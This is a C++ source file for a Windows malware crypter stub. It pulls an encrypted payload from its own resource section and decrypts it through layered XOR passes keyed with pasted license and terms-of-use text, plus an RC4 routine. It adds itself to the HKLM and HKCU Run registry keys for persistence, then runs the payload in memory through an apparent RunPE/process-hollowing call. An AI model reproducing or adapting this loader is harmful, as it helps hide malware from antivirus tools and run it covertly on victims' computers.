#define WIN32_LEAN_AND_MEAN	
#include "Runpe.h"
#include <vector>
#include <string>
#include <windows.h>
using namespace std;


void rc4_init(unsigned char* key, unsigned int key_length);
unsigned char rc4_output();
char cycle(char value);
void byteCipher(int mode, std::vector<char> &data);
unsigned int i, j;
unsigned char S[0x100]; // dec 256



int Rsize;
std::vector<char> RData;

void Resource(int id)
{
	size_t Rsize;

	HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(1), RT_RCDATA);
	HGLOBAL temp = LoadResource(NULL, hResource);
	Rsize = SizeofResource(NULL, hResource);
	RData.resize(Rsize);
	memcpy((void*)RData.data(), temp, Rsize);  // replace &RData[0] with RData.data() if C++11
}

void xor_crypt(const std::string &key, std::vector<char> &data)
{
	for (size_t i = 0; i != data.size(); i++)
		data[i] ^= key[i % key.size()];
}

void Decrypt(std::vector<char> &data)
{
	int len = data.size();
	char a;

	string strFinal;
	for (size_t i = 0; i != data.size(); i++)
		strFinal = data[i];

	for (int i = 0; i <= (len - 1); i++)
	{
		a = data.at(i);
		int b = (int)a;
		b -= 2;

		a = (char)b;
		strFinal.insert(i, 1, a);
	}
	string strDecrypted(strFinal, 0, len);
	for (size_t i = 0; i != data.size(); i++)
		data[i] = strDecrypted[i];
}



void enc()
{
	switch (RData.back())
	{
	case '1':
		{
			//std::ofstream out("1.txt");
		}
		break;
	case '2':
		{  
				
				xor_crypt("These Terms of Use tell you about our public services at the Wikimedia Foundation, our relationship to you as a user, and the rights and responsibilities that guide us both. We want you to know that we host an incredible quantity of educational and informational content, all of which is contributed and made possible by users like yourself. Generally we do not contribute, monitor, or delete content (with the rare exception of policies like these Terms of Use or legal compliance for DMCA notices). This means that editorial control is in the hands of you and your fellow users who create and manage the content. We merely host this content.", RData); //Encrypt it
				xor_crypt("mathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomework", RData);
				Decrypt(RData);	
				xor_crypt("This software is provided 'as is' with no explicit or implied warranties in respect of its properties, including, but not limited to, correctness and/or fitness for purpose.This software is provided 'as is' with no explicit or implied warranties in respect of its properties, including, but not limited to, correctness and/or fitness for purpose.This software is provided 'as is' with no explicit or implied warranties in respect of its properties, including, but not limited to, correctness and/or fitness for purpose.", RData);
				
				xor_crypt("These Terms of Use tell you about our public services at the Wikimedia Foundation, our relationship to you as a user, and the rights and responsibilities that guide us both. We want you to know that we host an incredible quantity of educational and informational content, all of which is contributed and made possible by users like yourself. Generally we do not contribute, monitor, or delete content (with the rare exception of policies like these Terms of Use or legal compliance for DMCA notices). This means that editorial control is in the hands of you and your fellow users who create and manage the content. We merely host this content.", RData); //Encrypt it
				xor_crypt("mathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomework", RData);
				Decrypt(RData);
				xor_crypt("This software is provided 'as is' with no explicit or implied warranties in respect of its properties, including, but not limited to, correctness and/or fitness for purpose.This software is provided 'as is' with no explicit or implied warranties in respect of its properties, including, but not limited to, correctness and/or fitness for purpose.This software is provided 'as is' with no explicit or implied warranties in respect of its properties, including, but not limited to, correctness and/or fitness for purpose.", RData);

				break;
		}
		
	case '3':
	{			
				Decrypt(RData);
				break;
	}
	case '4':
	{
				byteCipher(0, RData);
	}
	}
	return;
}

void su(char * startupname)
{
	printf("name:%s\n", startupname);
	TCHAR szPath[MAX_PATH];
	GetModuleFileName(NULL, szPath, MAX_PATH);
	HKEY newValue;
	RegOpenKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue);
	RegSetValueEx(newValue,'\0' + startupname, 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
	RegCloseKey(newValue);
	RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue);
	RegSetValueEx(newValue,'\0' + startupname, 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
	RegCloseKey(newValue);

}



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{

	Resource(1);
	enc();

	LPVOID pFile;
	TCHAR szFilePath[1024];
	
	su("");
	pFile = RData.data();
	if (pFile)
	{
		GetModuleFileNameA(0, LPSTR(szFilePath), 1024);
		//replace process.exe with "szFilePath" if you want to inject it in the SAME file.
		//or you may write the file path you want to inject in.
		ExecFile(LPSTR(szFilePath), pFile);
	}
	return 0;
};



void byteCipher(int mode, std::vector<char> &data){

	std::string keyString = "penguin";
	if (mode == 2) {

		rc4_init((unsigned char *)keyString.c_str(), keyString.length()); // setting up RC4 using the password
	}
	// RC4 setup
	// loop until file pointer has reached the end of the file

	for (int i = 0; i < data.size(); i++){
		// going over every byte in the file
		switch (mode) {
		case 0: // inversion
			data[i] = ~data[i];
			break;
		case 1: // cycle
			//data[i] = cycle(data[i]);
			break;
		case 2: // RC4
			data[i] = data[i] ^ rc4_output();
			break;
		}
	}

	/*for (int i = 0; i < data.size(); i++){
		data[i] = data[i] ^ rc4_output();
	}*/

}
/*status: completed

* description:

* byte cycling algorithm

*/

char cycle(char value)
{

	int leftMask = 170;

	int rightMask = 85;

	int iLeft = value & leftMask;

	int iRight = value & rightMask;

	iLeft = iLeft >> 1;
	iRight = iRight << 1;
	return iLeft | iRight;
}
// ---------------------------------------------------------------------------
/* status: completed
* description:
* RC4 stream initializer
*/
void rc4_init(unsigned char* key, unsigned int key_length) {
	for (i = 0; i < 0x100; i++)
		S[i] = i;
	for (i = j = 0; i < 0x100; i++) {
		unsigned char temp;
		j = (j + key[i % key_length] + S[i]) & 0xFF;
		temp = S[i];
		S[i] = S[j];
		S[j] = temp;
	}
	i = j = 0;
}
// ---------------------------------------------------------------------------
/* status: completed
* description:
* RC4 stream byte generator
*/
unsigned char rc4_output()
{
	unsigned char temp;
	i = (i + 1) & 0xFF;
	j = (j + S[i]) & 0xFF;
	temp = S[i];
	S[i] = S[j];
	S[j] = temp;
	return S[(S[i] + S[j]) & 0xFF];
}
//---------------------------------------------------------------------------


